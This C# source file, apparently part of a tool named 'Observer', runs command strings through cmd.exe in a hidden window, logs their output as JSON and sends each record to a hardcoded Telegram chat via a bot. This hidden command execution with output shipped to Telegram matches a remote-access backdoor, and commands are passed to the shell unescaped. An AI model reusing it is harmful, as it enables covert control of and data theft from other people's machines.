using System.Diagnostics;
using System.Text.RegularExpressions;

namespace Observer
{
    //Работа с файлом результатов выполнения команд
    class Files
    {
        //Получить конфигурацию
        public Tuple<string, int, string, string> GetConfig()
        {
            string ID = "";
            int delay = 60000;
            string tgID = "873942145";
            string tgToken = "";

            StreamReader sr = new StreamReader("Config.txt");
            try
            {
                ID = sr.ReadLine();
                delay = Convert.ToInt32(sr.ReadLine());
                tgID = sr.ReadLine();
                tgToken = sr.ReadLine();
                sr.Close();
            }
            catch (Exception)
            {

                ID = "0";
                delay = 60000;
            }
            var conf = Tuple.Create(ID, delay, tgID, tgToken);
            return conf;
        }

        //Запись в файл результатов команды
        public void writeFile(string comand, string ID)
        {
            try
            {
                Process processCMD = Process.Start(new ProcessStartInfo
                {
                    FileName = "cmd",
                    //нужно использовать кодировку иначе будут кракозябры
                    Arguments = "/c chcp 65001 & " + comand,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });

                Console.WriteLine("Это моя консоль и...\n");
                string cmdTxt = "";
                DateTime localDate = DateTime.Now;
                cmdTxt = "{\"PC_id\": \"" + ID + "\", \"LocalDate\" : \"" + localDate.ToString() + "\",\"Command\":\"" + comand + "\",\n\"text\" : \"" + processCMD.StandardOutput.ReadToEnd() + "\"}";
                //Pass the filepath and filename to the StreamWriter Constructor
                StreamWriter sw = new StreamWriter("Test.txt", true);
                //Write a line of text
                sw.WriteLine(cmdTxt);
                //Close the file
                sw.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine("Exception: " + e.Message);
            }
            finally
            {
                Console.WriteLine("Конец записи.");
            }
        }

        public async void GetRes(TG tg)
        {
            try
            {
                //Pass the file path and file name to the StreamReader constructor
                StreamReader sr = new StreamReader("Test.txt");
                //Read the first line of text
                string text = sr.ReadToEnd();
                //close the file
                sr.Close();
                string patternOpen = "{\"";
                string patternClose = "\"}";

                int amount = new Regex(patternClose).Matches(text).Count;
                Console.WriteLine(amount);
                for (int i = 0; i < amount; i++)
                {
                    string substring = text.Substring(text.IndexOf(patternOpen), text.IndexOf(patternClose) + 2);
                    Console.WriteLine(i + 1 + " Блок");
                    Console.WriteLine(substring);
                    sendFile(tg, substring);
                    text = text.Remove(text.IndexOf(patternOpen), text.IndexOf(patternClose) + 2);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("Exception: " + e.Message);
            }
            finally
            {
                Console.WriteLine("Конец чтения.");
            }
            //Console.ReadLine();
        }

        //Отправка результата
        public void sendFile(TG tg, string txt)
        {
            tg.SendJsonMessage(txt);
            File.Delete("Test.txt");
        }
    }
}
